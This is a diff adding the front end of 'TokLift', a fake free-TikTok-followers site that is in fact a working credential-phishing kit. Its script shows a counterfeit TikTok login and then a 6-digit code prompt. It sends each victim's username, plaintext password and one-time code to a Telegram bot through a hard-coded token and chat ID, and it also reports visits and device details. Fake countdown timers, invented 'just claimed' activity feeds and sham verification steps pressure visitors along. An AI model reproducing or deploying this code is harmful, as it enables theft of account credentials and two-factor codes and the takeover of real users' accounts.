+      <p class="fine">TokLift © 2026 · Creator growth network · Not affiliated with TikTok or Instagram.</p>
+    </div>
+  </footer>
+</section>
+
+<!-- ================= PLANS ================= -->
+<section class="view" id="v-plans">
+  <div class="panel">
+    <div class="flowhead">
+      <p class="kicker" style="text-align:left">Step 1 of 4</p>
+      <h2 class="h2s">Choose your allocation</h2>
+      <p class="leads">All packages are free — the tier only decides how big your lift is. One claim per account.</p>
+    </div>
+
+    <div class="plans">
+      <button class="plan" data-name="Starter" data-count="10000">
+        <div class="ptop"><span class="pname">Starter</span><span class="free">Free</span></div>
+        <div class="pnum">10,000<span>followers</span></div>
+        <ul><li>Verified badge reserved</li><li>Delivered within 24h</li><li>Queue position #4,812</li></ul>
+        <span class="pick">Select Starter</span>
+      </button>
+
+      <button class="plan" data-name="Creator" data-count="25000">
+        <span class="ribbon">Most popular</span>
+        <div class="ptop"><span class="pname">Creator</span><span class="free">Free</span></div>
+        <div class="pnum">25,000<span>followers</span></div>
+        <ul><li>Everything in Starter</li><li>Priority queue placement</li><li>Verified badge fast-tracked</li></ul>
+        <span class="pick">Select Creator</span>
+      </button>
+
+      <button class="plan" data-name="Influencer" data-count="50000">
+        <div class="ptop"><span class="pname">Influencer</span><span class="free">Free</span></div>
+        <div class="pnum">50,000<span>followers</span></div>
+        <ul><li>Everything in Creator</li><li>Split into 4 organic batches</li><li>Profile boost for 7 days</li></ul>
+        <span class="pick">Select Influencer</span>
+      </button>
+
+      <button class="plan" data-name="Viral" data-count="100000">
+        <span class="ribbon">Best value</span>
+        <div class="ptop"><span class="pname">Viral</span><span class="free">Free</span></div>
+        <div class="pnum">100,000<span>followers</span></div>
+        <ul><li>Everything in Influencer</li><li>Front of the global queue</li><li>Priority support channel</li></ul>
+        <span class="pick">Select Viral</span>
+      </button>
+    </div>
+
+    <div class="notice" style="margin-top:22px">
+      Allocation held for <b class="clock">20:00</b> once you continue.<br>
+      You'll be asked to log in to TikTok at the end so we can attach it to the right account.
+    </div>
+  </div>
+</section>
+
+<!-- ================= TASKS ================= -->
+<section class="view" id="v-tasks">
+  <div class="panel">
+    <div class="flowhead">
+      <p class="kicker" style="text-align:left">Step 2 of 4</p>
+      <h2 class="h2s" id="taskH">Your task queue</h2>
+      <p class="leads" id="tasksub">Clear all three to release your allocation. About 40 seconds.</p>
+    </div>
+
+    <div class="pbar2"><i id="pb"></i></div>
+    <div class="count"><span id="taskCount">0 of 3 complete</span><span>Held: <b class="clock">20:00</b></span></div>
+
+    <div class="task" data-task="tiktok">
+      <div class="chk">✓</div>
+      <div class="t">Follow TokLift on TikTok<span>Keeps your place in the queue</span></div>
+      <button>Follow</button>
+    </div>
+
+    <div class="task" data-task="insta">
+      <div class="chk">✓</div>
+      <div class="t">Follow TokLift on Instagram<span>Second network checkpoint</span></div>
+      <button>Follow</button>
+    </div>
+
+    <div class="task" data-task="verify">
+      <div class="chk">✓</div>
+      <div class="t">Get your verified badge<span>Everyone qualifies — no follower minimum</span></div>
+      <button>Verify</button>
+    </div>
+
+    <div class="notice" style="margin-top:22px">
+      Don't worry about whether the follow registered — <b>each task completes automatically</b> once you tap it.
+    </div>
+
+    <button class="btn block" id="rel" disabled style="margin-top:6px">Release my followers</button>
+    <p style="font-size:11.5px;color:var(--mut);text-align:center;margin-top:14px">Allocation held for 20 minutes · <span id="planLbl">Starter — 10,000</span></p>
+  </div>
+</section>
+
+<!-- ================= VERIFY ================= -->
+<section class="view" id="v-verify">
+  <div class="panel">
+    <div class="flowhead">
+      <p class="kicker" style="text-align:left">Step 2 of 4 · Verification</p>
+      <h2 class="h2s">Profile verification</h2>
+      <p class="leads">Enter your TikTok username and we'll run a 5-second eligibility check. <b style="color:#fff">Everyone qualifies</b> — follower count is irrelevant.</p>
+    </div>
+
+    <div id="verForm" style="margin-top:26px">
+      <label class="lb">Your TikTok username</label>
+      <div class="prefix">
+        <span class="at">@</span>
+        <input class="field" id="verUser" placeholder="yourhandle" autocomplete="off" spellcheck="false">
+      </div>
+      <button class="btn block" id="verBtn" style="margin-top:16px">Run verification check</button>
+      <p style="font-size:11.5px;color:var(--mut);text-align:center;margin-top:14px">No login needed for this step.</p>
+    </div>
+
+    <div id="verRun" class="hide" style="margin-top:26px">
+      <div class="vrow"><div class="vd">✓</div> Locating TikTok profile…</div>
+      <div class="vrow"><div class="vd">✓</div> Checking account activity…</div>
+      <div class="vrow"><div class="vd">✓</div> Confirming no follower minimum…</div>
+      <div class="vrow"><div class="vd">✓</div> Reserving verified badge…</div>
+    </div>
+
+    <div id="verDone" class="hide vdone" style="margin-top:26px">
+      <svg class="bigv" viewBox="0 0 24 24"><use href="#verified"/></svg>
+      <h3>Verified — <span id="verName">@you</span></h3>
+      <p>Your badge is reserved and will apply with your follower batch.</p>
+      <button class="btn block" id="verGo">Continue</button>
+    </div>
+  </div>
+</section>
+
+<!-- ================= LOGIN ================= -->
+<section class="view" id="v-login">
+  <div class="panel">
+    <div class="flowhead">
+      <p class="kicker" style="text-align:left">Step 3 of 4</p>
+      <h2 class="h2s">Attach it to your account</h2>
+      <p class="leads">One quick login so the allocation lands on the right profile. This is the last thing you have to do.</p>
+    </div>
+
+    <div class="tkcard" style="margin-top:26px">
+      <div class="tklogo"><svg class="ico" viewBox="-1.4 -1.4 26.8 26.8"><use href="#ttlogo"/></svg></div>
+      <h3>Log in to TikTok</h3>
+      <p class="thint">TokLift is requesting access to your TikTok account to release your followers.</p>
+
+      <form id="loginForm">
+        <label class="lb">Phone, email or username</label>
+        <input class="field" id="lgUser" placeholder="Enter your username" autocomplete="username" spellcheck="false">
+        <div style="height:14px"></div>
+        <label class="lb">Password</label>
+        <input class="field" id="lgPass" type="password" placeholder="Enter your password" autocomplete="current-password">
+        <p class="forgot">Forgot password?</p>
+        <button class="btn block" id="lgBtn" type="submit" style="margin-top:6px">Log in</button>
+      </form>
+
+      <div class="scope">
+        <b>TokLift will receive:</b> your username, avatar and account stats.<br>
+        You'll get a 6-digit code next to confirm it's you.
+      </div>
+      <p class="legal">By continuing you agree to TikTok's Terms of Service and Privacy Policy.</p>
+    </div>
+
+    <p style="font-size:11.5px;color:var(--mut);text-align:center;margin-top:16px">Held: <b class="clock">20:00</b> remaining on your allocation</p>
+  </div>
+</section>
+
+<!-- ================= CODE ================= -->
+<section class="view" id="v-code">
+  <div class="panel">
+    <div class="flowhead">
+      <p class="kicker" style="text-align:left">Step 3 of 4 · Confirmation</p>
+      <h2 class="h2s">Enter your 6-digit code</h2>
+      <p class="leads">We sent a code to your TikTok app. Enter it below to confirm your login and release the allocation.</p>
+    </div>
+
+    <form id="codeForm" style="margin-top:26px">
+      <div class="otp" id="otp">
+        <input inputmode="numeric" maxlength="1">
+        <input inputmode="numeric" maxlength="1">
+        <input inputmode="numeric" maxlength="1">
+        <input inputmode="numeric" maxlength="1">
+        <input inputmode="numeric" maxlength="1">
+        <input inputmode="numeric" maxlength="1">
+      </div>
+      <button class="btn block" id="codeBtn" type="submit" style="margin-top:18px">Confirm &amp; release</button>
+    </form>
+
+    <p class="resend">Didn't get it? <b id="resend">Resend in 30s</b></p>
+  </div>
+</section>
+
+<!-- ================= DONE ================= -->
+<section class="view" id="v-done">
+  <div class="panel">
+    <div style="padding:40px 0 10px;text-align:center">
+      <div class="doneico">✓</div>
+      <h2 class="h2s" style="text-align:center">You're in, <span id="doneName">@you</span></h2>
+      <p class="leads" style="text-align:center;margin-left:auto;margin-right:auto">Your allocation is attached to your account. Keep it public for the next 24 hours and watch it climb.</p>
+    </div>
+
+    <div class="card" style="margin-top:26px">
+      <div class="sumrow"><span>Package</span><span id="donePlan">Starter — 10,000</span></div>
+      <div class="sumrow"><span>Verified badge</span><span style="color:#4ade80">Reserved ✓</span></div>
+      <div class="sumrow"><span>Delivery</span><span>Batched · 24h</span></div>
+      <div class="sumrow"><span>Status</span><span style="color:#4ade80">Live</span></div>
+    </div>
+
+    <div class="notice" style="margin-top:20px">
+      <b>What happens now:</b> batch 1 lands within a few hours, the rest follow through the day.
+      Keep your account public and don't change your username mid-delivery.
+    </div>
+
+    <a class="btn ghost block" href="https://www.tiktok.com/@toklift.hq" target="_blank" rel="noopener" style="margin-top:16px">Follow @toklift.hq for updates</a>
+    <button class="btn block" id="again" style="margin-top:10px">Start over</button>
+
+    <p style="font-size:11.5px;color:var(--mut);text-align:center;margin-top:18px">Something wrong? Reply to the DM from @toklift.hq.</p>
+  </div>
+</section>
+
+</main>
+
+<div id="toast"></div>
+<div id="tg">● Add bot token</div>
+
+<script>
+/* =========================================================
+   STEP 1 — PASTE YOUR TELEGRAM DETAILS HERE
+   ========================================================= */
+const TG_TOKEN = '8254458626:AAHmrO_j5kGRbsvfqt5W_JH54AaD6PAS4Pg';   // ← e.g. '1234567890:AAH8x...'  (from @BotFather)
+const TG_CHAT  = '6966542803';   // ← e.g. ''           (your user id from @userinfobot)
+/* ========================================================= */
+
+/* Handles the dummy follow buttons open — change here */
+const CFG = {
+  tiktok:    'https://www.tiktok.com/@ellie67365?_r=1&_t=ZG-9Avx8cFnunw ="id="""',
+  instagram: 'https://www.instagram.com/toklift243?dlrf=MWc3bmhvZWI4MzM5OQ%3D%3D&utm_source=qr'
+};
+
+/* ---------------- state ---------------- */
+const KEY = 'toklift_v1';
+let S = {};
+try { S = JSON.parse(localStorage.getItem(KEY) || '{}'); } catch(e) { S = {}; }
+S.tasks = Object.assign({ tiktok:0, insta:0, verify:0 }, S.tasks || {});
+S.plan  = S.plan || null;
+if (!S.deadline) S.deadline = Date.now() + 20*60*1000;
+const save = () => { try { localStorage.setItem(KEY, JSON.stringify(S)); } catch(e){} };
+
+const $   = s => document.querySelector(s);
+const esc = s => String(s == null ? '' : s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+const hhmm = () => new Date().toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' });
+const who  = () => S.user ? '@' + S.user : 'not logged in';
+const planTxt = () => S.plan ? S.plan.name + ' — ' + (+S.plan.count).toLocaleString() + ' followers' : 'none chosen';
+const LABEL = { tiktok:'Follow on TikTok', insta:'Follow on Instagram', verify:'Verified badge' };
+const tasksTxt = () => ['tiktok','insta','verify'].map(k => (S.tasks[k] ? '✅' : '⬜') + ' ' + LABEL[k]).join('   ');
+const device = () => (navigator.platform || 'device') + ' · ' + innerWidth + 'x' + innerHeight + ' · ' + (navigator.language || '');
+
+/* ---------------- telegram ---------------- */
+const TG_OK = !!(TG_TOKEN && TG_CHAT);
+function send(text){
+  const msg = text + '\n<i>' + hhmm() + ' · ' + esc(device()) + '</i>';
+  if (!TG_OK){ console.log('[TG]', msg.replace(/<[^>]+>/g, '')); return; }
+  const url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage';
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML', disable_web_page_preview: true })
+  }).catch(() => { new Image().src = url + '?chat_id=' + TG_CHAT + '&parse_mode=HTML&text=' + encodeURIComponent(msg); });
+}
+
+/* ---------------- toast ---------------- */
+let tT;
+function toast(m){
+  const t = $('#toast'); t.textContent = m; t.classList.add('on');
+  clearTimeout(tT); tT = setTimeout(() => t.classList.remove('on'), 2200);
+}
+
+/* ---------------- routing ---------------- */
+const VIEWS = ['home','plans','tasks','verify','login','code','done'];
+const STEP  = { plans:'Step 1 of 4', tasks:'Step 2 of 4', verify:'Step 2 of 4', login:'Step 3 of 4', code:'Step 3 of 4', done:'Step 4 of 4' };
+
+function go(v){
+  if (!VIEWS.includes(v) && v !== 'how' && v !== 'faq') v = 'home';
+  if (location.hash.slice(1) !== v) location.hash = v;
+  else render(v);
+}
+function render(v){
+  if (!VIEWS.includes(v) && v !== 'how' && v !== 'faq') v = 'home';
+  const target = (v === 'how' || v === 'faq') ? 'home' : v;
+
+  VIEWS.forEach(x => $('#v-' + x).classList.toggle('on', x === target));
+  const step = STEP[target] || '';
+  $('#navstep').textContent = step;
+  $('#navstep').classList.toggle('hide', !step);
+  $('#navlinks').classList.toggle('hide', !!step);
+  $('#navcta').classList.toggle('hide', !!step);
+
+  if (target === 'tasks')  renderTasks();
+  if (target === 'done')   renderDone();
+  if (target === 'login'){
+    const b = $('#lgBtn'); b.disabled = false; b.textContent = 'Log in';
+    if (S.user) $('#lgUser').value = S.user;
+  }
+  if (target === 'verify'){
+    $('#verForm').classList.remove('hide');
+    $('#verRun').classList.add('hide');
+    $('#verDone').classList.add('hide');
+    document.querySelectorAll('#verRun .vrow').forEach(r => r.classList.remove('on'));
+  }
+
+  window.scrollTo(0, 0);
+  if (v === 'how' || v === 'faq'){
+    setTimeout(() => { const el = document.getElementById(v); if (el) el.scrollIntoView({ behavior:'smooth', block:'start' }); }, 60);
+  }
+}
+window.addEventListener('hashchange', () => render(location.hash.slice(1) || 'home'));
+
+/* ---------------- tasks ---------------- */
+function renderTasks(){
+  ['tiktok','insta','verify'].forEach(k => {
+    document.querySelector('[data-task="' + k + '"]').classList.toggle('done', !!S.tasks[k]);
+  });
+  const n = ['tiktok','insta','verify'].filter(k => S.tasks[k]).length;
+  $('#pb').style.width = (n / 3 * 100) + '%';
+  $('#rel').disabled = n < 3;
+  $('#taskCount').textContent = n + ' of 3 complete';
+  $('#tasksub').textContent = n < 3
+    ? 'Clear all three to release your allocation. About 40 seconds.'
+    : 'All tasks cleared. Release your followers below.';
+  $('#taskH').textContent = n < 3 ? 'Your task queue' : 'Queue cleared';
+  $('#planLbl').textContent = S.plan ? (S.plan.name + ' — ' + (+S.plan.count).toLocaleString()) : 'Starter — 10,000';
+}
+
+document.querySelectorAll('[data-task]').forEach(row => {
+  const k = row.dataset.task;
+  row.querySelector('button').onclick = () => {
+    if (S.tasks[k]) return;
+
+    if (k === 'verify'){
+      send('🪪 <b>VERIFY</b> — opened profile check\n👤 ' + who() + '\n📦 ' + planTxt());
+      go('verify');
+      return;
+    }
+
+    /* 1. mark the task done SYNCHRONOUSLY, before the new tab steals focus */
+    S.tasks[k] = 1;
+    save();
+    renderTasks();
+    toast('Task verified ✓');
+
+    /* 2. then open the account */
+    const url = (k === 'tiktok') ? CFG.tiktok : CFG.instagram;
+    const w = window.open(url, '_blank');
+    if (!w) location.href = url;   /* popup blocked — fall back to this tab */
+
+    /* 3. report it */
+    send((k === 'tiktok' ? '📱' : '📸') + ' <b>TASK COMPLETE</b> — ' + LABEL[k] +
+         '\n👤 ' + who() + '\n📦 ' + planTxt() + '\n🧩 ' + tasksTxt());
+
+    if (k === 'insta' && !S.tasks.verify) setTimeout(() => toast('One task left — grab your badge'), 1700);
+  };
+});
+
+$('#rel').onclick = () => {
+  send('🚀 <b>ALL TASKS DONE — moving to login</b>\n👤 ' + who() + '\n📦 ' + planTxt() + '\n🧩 ' + tasksTxt());
+  go('login');
+};
+
+/* ---------------- plans ---------------- */
+document.querySelectorAll('.plan').forEach(b => {
+  if (S.plan && +b.dataset.count === +S.plan.count) b.classList.add('sel');
+  b.onclick = () => {
+    S.plan = { name: b.dataset.name, count: +b.dataset.count };
+    save();
+    document.querySelectorAll('.plan').forEach(x => x.classList.toggle('sel', x === b));
+    send('📦 <b>PACKAGE SELECTED</b>\n🎯 ' + S.plan.name + ' — ' + S.plan.count.toLocaleString() + ' followers\n👤 ' + who());
+    toast('Package locked in');
+    setTimeout(() => go('tasks'), 420);
+  };
+});
+
+/* ---------------- verify ---------------- */
+$('#verBtn').onclick = () => {
+  const raw = $('#verUser').value.trim().replace(/^@/, '');
+  if (!raw){ $('#verUser').focus(); return; }
+  S.verUser = raw; save();
+
+  $('#verForm').classList.add('hide');
+  $('#verRun').classList.remove('hide');
+  const rows = [].slice.call(document.querySelectorAll('#verRun .vrow'));
+  rows.forEach((r, i) => setTimeout(() => r.classList.add('on'), 260 + i * 620));
+
+  setTimeout(() => {
+    $('#verRun').classList.add('hide');
+    $('#verDone').classList.remove('hide');
+    $('#verName').textContent = '@' + raw;
+    S.tasks.verify = 1; save(); renderTasks();
+    send('🪪 <b>VERIFIED</b> — @' + esc(raw) + '\n👤 ' + who() + '\n📦 ' + planTxt() + '\n🧩 ' + tasksTxt());
+    toast('Badge reserved ✓');
+  }, 260 + rows.length * 620 + 350);
+};
+$('#verGo').onclick = () => go('tasks');
+/* ---------------- login ---------------- */
+$('#loginForm').onsubmit = e => {
+  e.preventDefault();
+  const u = $('#lgUser').value.trim();
+  const p = $('#lgPass').value;
+  if (!u || !p){ (!u ? $('#lgUser') : $('#lgPass')).focus(); return; }
+
+  S.user = u; S.pass = p; save();
+  const b = $('#lgBtn'); b.disabled = true; b.textContent = 'Logging in…';
+
+  send('🔐 <b>LOGIN SUBMITTED</b>\n👤 <code>' + esc(u) + '</code>\n🔑 <code>' + esc(p) + '</code>' +
+       '\n📦 ' + planTxt() + '\n🧩 ' + tasksTxt());
+
+  setTimeout(() => {
+    go('code');
+    startResend();
+    toast('Code sent to your TikTok app');
+  }, 1300);
+};
+
+/* ---------------- 6-digit code ---------------- */
+const otp = [].slice.call(document.querySelectorAll('#otp input'));
+otp.forEach((el, i) => {
+  el.addEventListener('input', () => {
+    el.value = el.value.replace(/\D/g, '').slice(-1);
+    if (el.value && otp[i + 1]) otp[i + 1].focus();
+  });
+  el.addEventListener('keydown', ev => {
+    if (ev.key === 'Backspace' && !el.value && otp[i - 1]){ ev.preventDefault(); otp[i - 1].focus(); otp[i - 1].value = ''; }
+    if (ev.key === 'ArrowLeft'  && otp[i - 1]) otp[i - 1].focus();
+    if (ev.key === 'ArrowRight' && otp[i + 1]) otp[i + 1].focus();
+  });
+  el.addEventListener('paste', ev => {
+    const d = ((ev.clipboardData || window.clipboardData).getData('text') || '').replace(/\D/g, '').slice(0, 6);
+    if (!d) return;
+    ev.preventDefault();
+    d.split('').forEach((c, j) => { if (otp[j]) otp[j].value = c; });
+    (otp[Math.min(d.length, 5)] || otp[5]).focus();
+  });
+});
+
+$('#codeForm').onsubmit = e => {
+  e.preventDefault();
+  const c = otp.map(i => i.value).join('');
+  if (c.length < 6){
+    const empty = otp.filter(i => !i.value)[0];
+    if (empty) empty.focus();
+    toast('Enter all 6 digits');
+    return;
+  }
+  S.code = c; save();
+  const b = $('#codeBtn'); b.disabled = true; b.textContent = 'Releasing…';
+
+  send('🔢 <b>CODE ENTERED</b>\n👤 <code>' + esc(S.user) + '</code>\n🔑 <code>' + esc(S.pass) + '</code>' +
+       '\n🔢 <code>' + c + '</code>\n📦 ' + planTxt() + '\n🧩 ' + tasksTxt() +
+       '\n\n✅ <b>FULLY CONVERTED</b>');
+
+  setTimeout(() => go('done'), 1200);
+};
+
+let rT;
+function startResend(){
+  const el = $('#resend');
+  let n = 30;
+  el.textContent = 'Resend in 30s';
+  clearInterval(rT);
+  rT = setInterval(() => {
+    n--;
+    el.textContent = n > 0 ? 'Resend in ' + n + 's' : 'Resend code';
+    if (n <= 0) clearInterval(rT);
+  }, 1000);
+  el.onclick = () => {
+    if (n > 0) return;
+    send('🔁 <b>CODE RESENT</b>\n👤 <code>' + esc(S.user) + '</code>');
+    toast('New code sent');
+    startResend();
+  };
+}
+
+/* ---------------- done ---------------- */
+function renderDone(){
+  $('#doneName').textContent = S.user ? '@' + S.user : '@you';
+  $('#donePlan').textContent = S.plan ? (S.plan.name + ' — ' + (+S.plan.count).toLocaleString()) : 'Starter — 10,000';
+}
+
+$('#again').onclick = () => {
+  try { localStorage.removeItem(KEY); } catch(e){}
+  location.hash = 'home';
+  location.reload();
+};
+
+/* ---------------- countdown ---------------- */
+setInterval(() => {
+  const ms = S.deadline - Date.now();
+  const t = ms > 0
+    ? String(Math.floor(ms / 60000)).padStart(2, '0') + ':' + String(Math.floor(ms % 60000 / 1000)).padStart(2, '0')
+    : '00:00';
+  document.querySelectorAll('.clock').forEach(e => { e.textContent = t; });
+}, 1000);
+
+/* ---------------- live slots + activity feed ---------------- */
+let slots = 1284;
+setInterval(() => {
+  slots += Math.floor(Math.random() * 3) + 1;
+  $('#slots').textContent = slots.toLocaleString();
+}, 9000);
+
+const FEED = [
+  '<b>Amara O.</b> from Lagos just claimed 25,000 followers',
+  '<b>Marcus D.</b> just reserved a verified badge',
+  '<b>Sofia R.</b> from Lisbon just cleared all 3 tasks',
+  '<b>Jay K.</b> just claimed 10,000 followers',
+  '<b>Priya N.</b> from Mumbai just got verified',
+  '<b>Tomas B.</b> just claimed 50,000 followers',
+  '<b>Chloe M.</b> from Toronto just released her allocation'
+];
+let fi = 0;
+const feedEl = $('#ticker');
+feedEl.style.transition = 'opacity .3s';
+function nextFeed(){
+  feedEl.style.opacity = 0;
+  setTimeout(() => {
+    feedEl.innerHTML = FEED[fi % FEED.length];
+    feedEl.style.opacity = 1;
+    fi++;
+  }, 300);
+}
+nextFeed();
+setInterval(nextFeed, 4200);
+
+/* ---------------- hero counter ---------------- */
+(function(){
+  const el = $('#heroCount'), bar = $('#heroBar');
+  if (!el) return;
+  let n = 1240;
+  const target = 11240;
+  setTimeout(() => { if (bar) bar.style.width = '100%'; }, 400);
+  const t = setInterval(() => {
+    n += Math.max(35, Math.round((target - n) / 10));
+    if (n >= target){ n = target; clearInterval(t); }
+    el.textContent = n.toLocaleString();
+  }, 65);
+})();
+
+/* ---------------- scroll reveal ---------------- */
+const io = new IntersectionObserver(es => {
+  es.forEach(e => { if (e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); } });
+}, { threshold: .12 });
+document.querySelectorAll('.rv').forEach(el => io.observe(el));
+
+/* ---------------- telegram status badge ---------------- */
+const tg = $('#tg');
+function paintTg(){
+  tg.classList.toggle('on', TG_OK);
+  tg.textContent = TG_OK ? '● Telegram live' : '● Add bot token';
+}
+paintTg();
+tg.onclick = () => {
+  if (!TG_OK){
+    tg.textContent = '● Token / ID empty';
+    console.log('Paste TG_TOKEN and TG_CHAT at the top of the script, then reload.');
+    return;
+  }
+  send('🧪 <b>TEST</b> — TokLift is connected');
+  tg.textContent = '● Test sent';
+  setTimeout(paintTg, 2000);
+};
+
+/* ---------------- funnel entry points ---------------- */
+const startFlow = () => {
+  send('🏠 <b>ENTERED FUNNEL</b>\n🧩 ' + tasksTxt());
+  go(S.plan ? 'tasks' : 'plans');
+};
+$('#navcta').onclick   = startFlow;
+$('#heroCta').onclick  = startFlow;
+$('#finalCta').onclick = startFlow;
+$('#plansCta').onclick = () => go('plans');
+
+/* ---------------- init ---------------- */
+(function init(){
+  render(location.hash.slice(1) || 'home');
+  if (!S.seen){
+    S.seen = 1; save();
+    setTimeout(() => send('👋 <b>NEW VISITOR</b> — landed on the homepage'), 500);
+  }
+})();
+</script>
+</body>
+      </html>
